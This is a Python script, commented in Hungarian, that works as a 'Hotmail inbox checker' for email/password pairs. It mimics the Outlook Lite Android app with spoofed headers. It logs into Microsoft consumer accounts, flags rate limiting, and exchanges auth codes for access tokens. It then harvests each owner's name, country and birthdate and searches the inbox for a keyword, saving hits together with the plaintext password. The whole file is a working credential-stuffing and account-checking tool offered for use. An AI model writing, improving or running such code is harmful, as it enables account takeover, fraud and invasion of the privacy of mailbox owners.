import requests
import uuid
import json
import re
import time

# ============================================================
# FIX USER-AGENTEK (Config-ból, NEM random!)
# ============================================================
UA_ANDROID_WEBVIEW = (
    "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) "
    "AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 "
    "Mobile Safari/537.36 PKeyAuth/1.0"
)
UA_OUTLOOK_API = "Outlook-Android/2.0"
UA_DALVIK = "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)"


def checker_worker_single(email: str, password: str, keyword: str):
    """
    Hotmail inbox checker – Config-ból 1:1 átírva.
    Returns: hit / custom / bad / retry / error
    """
    session = requests.Session()

    # EGY UUID AZ EGÉSZ SESSIONRE (Config!)
    session_uuid = str(uuid.uuid4())

    try:
        # ========================================================
        # STEP 0: HRD PRE-CHECK (HIÁNYZOTT!)
        # ========================================================
        hrd_url = (
            "https://odc.officeapps.live.com/odc/emailhrd/getidp"
            f"?hm=1&emailAddress={email}"
        )
        hrd_headers = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": session_uuid,
            "X-Office-Application": "145",
            "X-OneAuth-Version": "1.83.0",
            "X-Office-Platform": "Android",
            "X-Office-Platform-Version": "28",
            "Enlightened-Hrd-Client": "0",
            "X-OneAuth-AppId": "com.microsoft.outlooklite",
            "User-Agent": UA_DALVIK,
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }

        hrd_resp = session.get(hrd_url, headers=hrd_headers, timeout=30)
        hrd_text = hrd_resp.text

        # Config keycheck: Neither/Both/Placeholder/OrgId → Failure
        if any(kw in hrd_text for kw in ["Neither", "Both", "Placeholder", "OrgId"]):
            return {"status": "bad", "reason": "Not MSAccount"}

        # Config keycheck: MSAccount → Success
        if "MSAccount" not in hrd_text:
            return {"status": "bad", "reason": "Not MSAccount"}

        # ========================================================
        # STEP 1: GET /authorize (PPFT + urlPost)
        # ========================================================
        authorize_url = (
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
            f"client_info=1&haschrome=1&login_hint={email}"
            "&mkt=en&response_type=code"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&scope=profile%20openid%20offline_access"
            "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
            "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        )

        get_headers = {
            "Host": "login.microsoftonline.com",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "User-Agent": UA_ANDROID_WEBVIEW,
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/avif,image/webp,image/apng,*/*;q=0.8,"
                "application/signed-exchange;v=b3;q=0.9"
            ),
            "return-client-request-id": "false",
            "client-request-id": session_uuid,
            "x-ms-sso-ignore-sso": "1",
            "correlation-id": session_uuid,
            "x-client-ver": "1.1.0+9e54a0d1",
            "x-client-os": "28",
            "x-client-sku": "MSAL.xplat.android",
            "x-client-src-sku": "MSAL.xplat.android",
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
        }

        resp = session.get(
            authorize_url, headers=get_headers,
            allow_redirects=True, timeout=30
        )
        source = resp.text

        # urlPost kinyerése
        urlPost = ""
        m = re.search(r'"urlPost"\s*:\s*"([^"]+)"', source)
        if m:
            urlPost = m.group(1)

        # PPFT kinyerése
        PPFT = ""
        m = re.search(r'name="PPFT"[^>]*value="([^"]+)"', source)
        if m:
            PPFT = m.group(1)

        if not PPFT or not urlPost:
            return {"status": "bad", "reason": "No PPFT/urlPost"}

        # Referer (config: ADDRESS-ből "haschrome=1"-ig)
        full_address = str(resp.url)
        parts = full_address.split("haschrome=1")
        referer = f"{parts[0]}haschrome=1" if len(parts) > 1 else full_address

        # ========================================================
        # STEP 2: POST login
        # ========================================================
        cookies_dict = session.cookies.get_dict()

        # FIX: PPSX=PassportR (nem Passport!)
        # FIX: i19=9960 (nem 3772!)
        form_data = (
            f"i13=1&login={email}&loginfmt={email}"
            f"&type=11&LoginOptions=1&lrt=&lrtPartition="
            f"&hisRegion=&hisScaleUnit=&passwd={password}"
            f"&ps=2&psRNGCDefaultType=&psRNGCEntropy="
            f"&psRNGCSLK=&canary=&ctx=&hpgrequestid="
            f"&PPFT={PPFT}"
            f"&PPSX=PassportR"
            f"&NewUser=1&FoundMSAs=&fspost=0&i21=0"
            f"&CookieDisclosure=0&IsFidoSupported=0"
            f"&isSignupPost=0&isRecoveryAttemptPost=0"
            f"&i19=9960"
        )

        # FIX: +RefreshTokenSso + MicrosoftApplicationsTelemetryDeviceId
        cookie_str = (
            f"MSPRequ={cookies_dict.get('MSPRequ', '')}; "
            f"uaid={cookies_dict.get('uaid', '')}; "
            f"RefreshTokenSso={cookies_dict.get('RefreshTokenSso', '')}; "
            f"MSPOK={cookies_dict.get('MSPOK', '')}; "
            f"OParams={cookies_dict.get('OParams', '')}; "
            f"MicrosoftApplicationsTelemetryDeviceId={session_uuid}"
        )

        post_headers = {
            "Host": "login.live.com",
            "Connection": "keep-alive",
            "Content-Length": str(len(form_data)),
            "Cache-Control": "max-age=0",
            "Upgrade-Insecure-Requests": "1",
            "Origin": "https://login.live.com",
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": UA_ANDROID_WEBVIEW,
            "Accept": (
                "text/html,application/xhtml+xml,application/xml;q=0.9,"
                "image/avif,image/webp,image/apng,*/*;q=0.8,"
                "application/signed-exchange;v=b3;q=0.9"
            ),
            "X-Requested-With": "com.microsoft.outlooklite",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-User": "?1",
            "Sec-Fetch-Dest": "document",
            "Referer": referer,
            "Accept-Encoding": "gzip, deflate",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie_str,
        }

        post_resp = session.post(
            urlPost, data=form_data,
            headers=post_headers,
            allow_redirects=False, timeout=30
        )

        post_source = post_resp.text
        post_cookies = session.cookies.get_dict()
        all_cookies_str = str(post_cookies)
        location = post_resp.headers.get("Location", "")

        # ========================================================
        # BAN DETEKCIÓ (HIÁNYZOTT!)
        # ========================================================
        if "too many times with" in post_source:
            return {"status": "retry", "reason": "Rate limited"}

        # ========================================================
        # SUCCESS CHECK (Config: JSH/JSHP/ANON/WLSSC cookies)
        # ========================================================
        is_success = (
            "JSH" in all_cookies_str
            or "JSHP" in all_cookies_str
            or "ANON" in all_cookies_str
            or "WLSSC" in all_cookies_str
            or "oauth20_desktop.srf" in location
            or "fntobu-y" in post_source
        )

        if not is_success:
            if "account or password is incorrect" in post_source:
                return {"status": "bad", "reason": "Wrong password"}

            error_count = post_source.count("error")
            if error_count > 0:
                return {"status": "bad", "reason": "Login error"}

            if ("identity/confirm" in post_source
                    or "Consent/Update" in post_source):
                return {"status": "bad", "reason": "Identity confirm"}

            if "account.live.com/recover" in post_source:
                return {"status": "bad", "reason": "Recovery needed"}

            if ("account.live.com/Abuse" in post_source
                    or "finisherror.srf" in location):
                return {"status": "bad", "reason": "Account blocked"}

            return {"status": "bad", "reason": "Auth failed"}

        # Második error check
        error_count = post_source.count("error")
        if error_count > 0:
            if not any(k in all_cookies_str for k in
                       ["JSH", "JSHP", "ANON", "WLSSC"]):
                return {"status": "bad", "reason": "Error in response"}

        # ========================================================
        # STEP 3: Auth code kinyerése
        # ========================================================
        auth_code = ""
        if post_resp.status_code in [301, 302, 303, 307, 308]:
            if "code=" in location:
                auth_code = location.split("code=")[1].split("&")[0]

        if not auth_code:
            m = re.search(r'code=([^&"\']+)', post_source)
            if m:
                auth_code = m.group(1)

        CID = post_cookies.get("MSPCID", "").upper()

        if not auth_code:
            return {"status": "bad", "reason": "No auth code"}

        # ========================================================
        # STEP 4: Token exchange (session.post!)
        # ========================================================
        token_form = (
            "client_info=1"
            "&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59"
            "&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite"
            "%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            "&grant_type=authorization_code"
            f"&code={auth_code}"
            "&scope=profile%20openid%20offline_access"
            "%20https%3A%2F%2Foutlook.office.com%2FM365.Access"
        )

        token_resp = session.post(
            "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data=token_form,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            allow_redirects=False,
            timeout=30
        )

        if (token_resp.status_code != 200
                or "access_token" not in token_resp.text):
            return {"status": "bad", "reason": "Token failed"}

        access_token = token_resp.json().get("access_token", "")
        if not access_token:
            return {"status": "bad", "reason": "No access_token"}

        # ========================================================
        # STEP 5: Profil lekérés
        # ========================================================
        Name = ""
        Country = ""
        Birthdate = "N/A"

        profile_headers = {
            "User-Agent": UA_OUTLOOK_API,
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
        }

        prof_resp = session.get(
            "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
            headers=profile_headers, timeout=30
        )

        if prof_resp.status_code == 200:
            try:
                pdata = prof_resp.json()
                if "accounts" in pdata and pdata["accounts"]:
                    acc = pdata["accounts"][0]
                    Country = acc.get("location", "")
                    bd = acc.get("birthDay", "")
                    bm = acc.get("birthMonth", "")
                    by_ = acc.get("birthYear", "")
                    if bd and bm and by_:
                        Birthdate = (
                            f"{by_}-{str(bm).zfill(2)}-{str(bd).zfill(2)}"
                        )
                if "names" in pdata and pdata["names"]:
                    Name = pdata["names"][0].get("displayName", "")
            except (json.JSONDecodeError, KeyError, IndexError):
                pass

        # ========================================================
        # STEP 6: StartupData (HIÁNYZOTT!)
        # ========================================================
        startup_url = (
            f"https://outlook.live.com/owa/{email}"
            f"/startupdata.ashx?app=Mini&n=0"
        )
        startup_headers = {
            "Host": "outlook.live.com",
            "content-length": "0",
            "x-owa-sessionid": session_uuid,
            "x-req-source": "Mini",
            "authorization": f"Bearer {access_token}",
            "user-agent": UA_ANDROID_WEBVIEW,
            "action": "StartupData",
            "x-owa-correlationid": session_uuid,
            "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
            "content-type": "application/json; charset=utf-8",
            "accept": "*/*",
            "origin": "https://outlook.live.com",
            "x-requested-with": "com.microsoft.outlooklite",
            "sec-fetch-site": "same-origin",
            "sec-fetch-mode": "cors",
            "sec-fetch-dest": "empty",
            "referer": "https://outlook.live.com/",
            "accept-encoding": "gzip, deflate",
            "accept-language": "en-US,en;q=0.9",
        }

        try:
            session.post(
                startup_url, data="",
                headers=startup_headers, timeout=30
            )
        except Exception:
            pass

        # ========================================================
        # STEP 7: Inbox keresés (JAVÍTOTT URL + payload!)
        # ========================================================
        # FIX: /searchservice/ (nem /search/!)
        # FIX: Nincs AnswerEntityRequests
        # FIX: n=88, Pacific Standard Time
        search_url = (
            "https://outlook.live.com/searchservice/api/v2/query"
            "?n=88&cv=z%2B4rC2Rg7h%2BxLG28lplshj.124"
        )

        search_payload = {
            "Cvid": "49c85090-df47-7cfc-7dff-b6f493b9eaec",
            "Scenario": {"Name": "owa.react"},
            "TimeZone": "Pacific Standard Time",
            "TextDecorations": "Off",
            "EntityRequests": [{
                "EntityType": "Conversation",
                "ContentSources": ["Exchange"],
                "Filter": {
                    "Or": [
                        {"Term": {
                            "DistinguishedFolderName": "msgfolderroot"
                        }},
                        {"Term": {
                            "DistinguishedFolderName": "DeletedItems"
                        }}
                    ]
                },
                "From": 0,
                "Query": {"QueryString": keyword},
                "RefiningQueries": None,
                "Size": 25,
                "Sort": [
                    {"Field": "Score",
                     "SortDirection": "Desc", "Count": 3},
                    {"Field": "Time",
                     "SortDirection": "Desc"}
                ],
                "EnableTopResults": True,
                "TopResultsCount": 3
            }],
            "QueryAlterationOptions": {
                "EnableSuggestion": True,
                "EnableAlteration": True,
                "SupportedRecourseDisplayTypes": [
                    "Suggestion",
                    "NoResultModification",
                    "NoResultFolderRefinerModification",
                    "NoRequeryModification",
                    "Modification"
                ]
            },
            "LogicalId": "50288413-6c68-e7d3-ab47-2be5431628f2"
        }

        search_headers = {
            "User-Agent": UA_OUTLOOK_API,
            "Pragma": "no-cache",
            "Accept": "application/json",
            "ForceSync": "false",
            "Authorization": f"Bearer {access_token}",
            "X-AnchorMailbox": f"CID:{CID}",
            "Host": "substrate.office.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip",
            "Content-Type": "application/json",
        }

        search_resp = session.post(
            search_url, json=search_payload,
            headers=search_headers, timeout=30
        )

        Total = "0"
        Date = "N/A"
        has_keyword_match = False

        if search_resp.status_code == 200:
            search_text = search_resp.text

            # HitHighlightedSummary check (config!)
            if "HitHighlightedSummary" in search_text:
                has_keyword_match = True

            # Total kinyerése
            total_match = re.search(r'"Total"\s*:\s*(\d+)', search_text)
            if total_match:
                Total = total_match.group(1)

            # FIX: LastDeliveryOrRenewTime (nem LastModifiedTime!)
            date_match = re.search(
                r'"LastDeliveryOrRenewTime"\s*:\s*"([^"]+)"',
                search_text
            )
            if date_match:
                raw_date = date_match.group(1)
                Date = raw_date.replace("T", " ")[:16]
            else:
                date_match2 = re.search(
                    r'"LastModifiedTime"\s*:\s*"([^"]+)"',
                    search_text
                )
                if date_match2:
                    raw_date = date_match2.group(1)
                    Date = raw_date.replace("T", " ")[:16]

        # ========================================================
        # EREDMÉNY KIÉRTÉKELÉS
        # ========================================================
        if Total != "0" and has_keyword_match:
            return {
                "status": "hit",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate,
                    "date": Date,
                    "mails": Total
                }
            }
        elif Name or Country:
            return {
                "status": "custom",
                "data": {
                    "email": email,
                    "password": password,
                    "country": Country,
                    "name": Name,
                    "birthdate": Birthdate
                }
            }
        else:
            return {"status": "bad", "reason": "No data"}

    except requests.exceptions.Timeout:
        return {"status": "retry", "reason": "Timeout"}
    except requests.exceptions.ConnectionError:
        return {"status": "retry", "reason": "Connection error"}
    except Exception as e:
        return {"status": "error", "reason": str(e)}
    finally:
        session.close()
